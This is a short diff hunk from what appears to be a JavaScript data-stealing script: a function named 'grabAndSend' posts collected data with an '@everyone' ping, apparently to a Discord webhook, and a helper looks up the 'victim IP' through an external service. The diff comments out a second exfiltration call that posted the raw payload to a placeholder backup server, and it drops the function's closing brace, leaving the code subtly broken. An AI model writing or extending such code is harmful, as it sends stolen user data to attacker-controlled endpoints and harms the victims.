@@ -167,13 +167,12 @@ async function grabAndSend() {
         body: JSON.stringify({ embeds: [embed], content: "@everyone" })
     }).catch(e => console.log(e));
     
-    // Also send raw JSON to a secondary endpoint
-    fetch('https://your-backup-server.com/log', {
-        method: 'POST',
-        body: JSON.stringify(payload),
-        headers: { 'Content-Type': 'application/json' }
-    }).catch(e => console.log(e));
-}
+       // // Also send raw JSON to a secondary endpoint
+    // fetch('https://your-backup-server.com/log', {
+    //     method: 'POST',
+    //     body: JSON.stringify(payload),
+    //     headers: { 'Content-Type': 'application/json' }
+    // }).catch(e => console.log(e));
 
 // Helper to get victim IP (using external service)
 async function getIP() {
